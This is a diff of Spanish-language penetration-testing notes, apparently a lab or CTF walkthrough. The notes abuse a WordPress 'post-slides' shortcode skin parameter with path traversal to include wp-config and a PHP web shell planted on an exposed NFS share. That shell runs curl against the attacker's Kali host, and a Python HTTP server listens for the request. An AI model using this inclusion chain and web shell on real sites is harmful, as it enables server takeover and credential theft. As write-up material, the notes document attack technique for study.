@@ -236,19 +236,21 @@ Paso 1:
 	- Dar click en '[+]' para agregar un 'Shortcode'
 
 # Agregar la siguiente linea:
+[post-slides skin="../../../../wp-config"]
+
 	[post-slides skin="../../../../../../../../../../../../../../../../var/nfs/documents/shell"]
 
 
 NOTA:
 	- La ruta de '/var/nfs/documents/' viene del puerto expuesto 'NFS' en donde se creo el archivo 'shell.php' malicioso 
-	- Se agrega automáticamente el '.php' en la ruta. O se no colocarlo al apuntar a algún recurso 
+	- La llamada al path agrega automáticamente el '.php' en la ruta. O sea no colocarlo al apuntar a algún recurso 
 ```
 
 ```bash 
 Paso 2:
 # Verificar si hay conectividad con Kali
 # Crear el archivo dentro del dir en nfs '/var/nfs/documents/' con el siguiente contenido
-❯ echo '<?php system("curl IP_Kali/hi"); ?>' > shell.php 
+❯ echo '<?php system("curl http://IP_Kali/hi"); ?>' > shell.php 
 
 ❯ python3 -m http.server 80  # Montar un servidor http para recibir la solicitud
 
